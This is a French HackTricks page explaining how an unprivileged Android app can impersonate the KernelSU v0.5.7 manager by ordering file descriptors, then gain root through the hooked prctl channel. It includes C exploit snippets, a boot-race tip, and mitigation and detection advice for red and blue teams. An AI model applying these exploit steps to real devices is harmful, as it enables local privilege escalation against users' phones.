# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Les frameworks de rooting tels que KernelSU, APatch, SKRoot et Magisk modifient fréquemment le kernel Linux/Android et exposent des fonctionnalités privilégiées à une app "manager" userspace non privilégiée via un syscall hooké. Si l’étape d’authentification du manager est défectueuse, n’importe quelle app locale peut atteindre ce canal et élever ses privilèges sur des appareils déjà rootés.

Cette page abstrait les techniques et les pièges mis en évidence par des recherches publiques (notamment l’analyse de KernelSU v0.5.7 par Zimperium) afin d’aider les équipes red et blue à comprendre les surfaces d’attaque, les primitives d’exploitation et les mitigations robustes.<sup>[[1]](#references)</sup>

---
## Architecture pattern : canal de manager hooké sur un syscall

- Un module/patch kernel hooke un syscall (généralement prctl) afin de recevoir des "commandes" depuis le userspace.
- Le protocole est généralement : magic_value, command_id, arg_ptr/len ...
- Une app manager userspace s’authentifie d’abord (par ex. CMD_BECOME_MANAGER). Une fois que le kernel a identifié l’appelant comme un manager de confiance, les commandes privilégiées sont acceptées :
- Accorder le root à l’appelant (par ex. CMD_GRANT_ROOT)
- Gérer les allowlists/deny-lists pour su
- Ajuster la policy SELinux (par ex. CMD_SET_SEPOLICY)
- Interroger la version/configuration
- Comme n’importe quelle app peut invoquer des syscalls, la correction de l’authentification du manager est critique.

Exemple (design de KernelSU) :
- Syscall hooké : prctl
- Magic value utilisé pour rediriger vers le handler KernelSU : 0xDEADBEEF
- Les commandes incluent : CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## Flux d’authentification de KernelSU v0.5.7 (tel qu’implémenté)

Lorsque le userspace appelle prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU vérifie :

1) Vérification du préfixe du chemin
- Le chemin fourni doit commencer par un préfixe attendu pour l’UID de l’appelant, par ex. /data/data/<pkg> ou /data/user/<id>/<pkg>.
- Référence : logique de préfixe du chemin dans core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Vérification de la propriété
- Le chemin doit appartenir à l’UID de l’appelant.
- Référence : logique de propriété dans core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Vérification de la signature de l’APK via un scan de la table des FDs
- Parcourir les descripteurs de fichiers (FDs) ouverts du processus appelant.
- Sélectionner le premier fichier dont le chemin correspond à /data/app/*/base.apk.
- Parser la signature APK v2 et la vérifier par rapport au certificat officiel du manager.
- Références : manager.c (parcours des FDs), apk_sign.c (vérification APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Si toutes les vérifications réussissent, le kernel met temporairement en cache l’UID du manager et accepte les commandes privilégiées provenant de cet UID jusqu’à sa réinitialisation.

---
## Classe de vulnérabilité : faire confiance au "premier APK correspondant" lors de l’itération des FDs

Si la vérification de signature est liée au "premier /data/app/*/base.apk correspondant" trouvé dans la table des FDs du processus, elle ne vérifie pas réellement le package de l’appelant. Un attaquant peut prépositionner un APK correctement signé (celui du véritable manager) afin qu’il apparaisse dans la table des FDs avant son propre base.apk.

Cette confiance par indirection permet à une app non privilégiée d’usurper l’identité du manager sans posséder sa clé de signature.<sup>[[1]](#references)</sup>

Propriétés clés exploitées :<sup>[[1]](#references)</sup>
- Le scan des FDs n’est pas lié à l’identité du package de l’appelant ; il effectue uniquement une correspondance de chaînes sur les chemins.
- open() renvoie le FD disponible portant le plus petit numéro. En fermant d’abord les FDs portant les numéros les plus bas, un attaquant peut contrôler l’ordre.
- Le filtre vérifie uniquement que le chemin correspond à /data/app/*/base.apk – il ne vérifie pas qu’il correspond au package installé de l’appelant.

---
## Préconditions de l’attaque

- L’appareil est déjà rooté avec un framework de rooting vulnérable (par ex. KernelSU v0.5.7).
- L’attaquant peut exécuter localement du code arbitraire non privilégié (processus d’app Android).
- Le véritable manager ne s’est pas encore authentifié (par ex. juste après un reboot). Certains frameworks mettent en cache l’UID du manager après une réussite ; il faut gagner la race.<sup>[[1]](#references)</sup>

---
## Schéma d’exploitation (KernelSU v0.5.7)

Étapes générales :<sup>[[1]](#references)[[9]](#references)</sup>
1) Construire un chemin valide vers le répertoire de données de sa propre app afin de satisfaire les vérifications du préfixe et de la propriété.
2) S’assurer qu’un véritable base.apk de KernelSU Manager est ouvert sur un FD portant un numéro inférieur à celui de son propre base.apk.
3) Invoquer prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) afin de passer les vérifications.
4) Envoyer des commandes privilégiées telles que CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY afin de rendre l’élévation persistante.

Notes pratiques concernant l’étape 2 (ordre des FDs) :<sup>[[1]](#references)</sup>
- Identifier le FD de son processus correspondant à son propre /data/app/*/base.apk en parcourant les symlinks /proc/self/fd.
- Fermer un FD portant un petit numéro (par ex. stdin, fd 0) et ouvrir d’abord l’APK légitime du manager afin qu’il occupe le fd 0 (ou tout autre index inférieur à celui du FD de son propre base.apk).
- Intégrer l’APK légitime du manager à son app afin que son chemin satisfasse le filtre naïf du kernel. Par exemple, le placer sous un sous-chemin correspondant à /data/app/*/base.apk.

Extraits de code d’exemple (Android/Linux, uniquement illustratifs) :

Énumérer les FDs ouverts afin de localiser les entrées base.apk :
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Forcer un FD portant un numéro inférieur à pointer vers l’APK légitime du manager :
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Authentification du gestionnaire via un hook prctl :
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Après réussite, commandes privilégiées (exemples) :
- CMD_GRANT_ROOT: promouvoir le processus actuel en root
- CMD_ALLOW_SU: ajouter votre package/UID à l’allowlist pour un su persistant
- CMD_SET_SEPOLICY: ajuster la policy SELinux selon les capacités du framework

Conseil de race/persistence :
- Enregistrer un receiver BOOT_COMPLETED dans AndroidManifest (RECEIVE_BOOT_COMPLETED) afin de démarrer rapidement après le reboot et de tenter l’authentification avant le véritable manager.<sup>[[1]](#references)</sup>

---
## Conseils de détection et de mitigation

Pour les développeurs de frameworks :
- Lier l’authentification au package/UID de l’appelant, et non à des FD arbitraires :
- Résoudre le package de l’appelant à partir de son UID et le vérifier par rapport à la signature du package installé (via PackageManager), plutôt que de parcourir les FD.
- Si l’approche est kernel-only, utiliser l’identité stable de l’appelant (task creds) et valider à partir d’une source de vérité stable gérée par init/helper userspace, et non par les FD du processus.
- Éviter les vérifications de préfixe de chemin comme mécanisme d’identité ; elles peuvent être facilement satisfaites par l’appelant.
- Utiliser un challenge–response basé sur un nonce via le channel et effacer toute identité de manager mise en cache au boot ou lors d’événements clés.
- Envisager une IPC authentifiée basée sur binder au lieu de surcharger des syscalls génériques lorsque cela est possible.

Pour les defenders/blue team :
- Détecter la présence de rooting frameworks et de processus de manager ; surveiller les appels prctl avec des magic constants suspectes (par ex. 0xDEADBEEF) si vous disposez de kernel telemetry.
- Dans les flottes gérées, bloquer ou signaler les boot receivers provenant de packages non fiables qui tentent rapidement d’exécuter des commandes privilégiées du manager après le boot.
- S’assurer que les appareils utilisent des versions patchées du framework ; invalider les IDs de manager mis en cache lors d’une mise à jour.

Limitations de l’attaque :
- Affecte uniquement les appareils déjà rootés avec un framework vulnérable.
- Nécessite généralement un reboot/fenêtre de race avant que le manager légitime ne s’authentifie (certains frameworks mettent en cache l’UID du manager jusqu’à sa réinitialisation).

---
## Notes connexes entre les frameworks

- L’authentification basée sur un mot de passe (par ex. les builds historiques d’APatch/SKRoot) peut être faible si les mots de passe sont devinables ou bruteforceables, ou si les validations sont défectueuses.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- L’authentification basée sur le package/la signature (par ex. KernelSU) est en principe plus robuste, mais doit être liée à l’appelant réel, et non à des artefacts indirects comme les scans de FD.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk : CVE-2024-48336 (MagiskEoP) a montré que même des écosystèmes matures peuvent être vulnérables à l’usurpation d’identité, entraînant une exécution de code avec les privilèges root dans le contexte du manager.<sup>[[1]](#references)[[8]](#references)</sup>

---
## Références

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
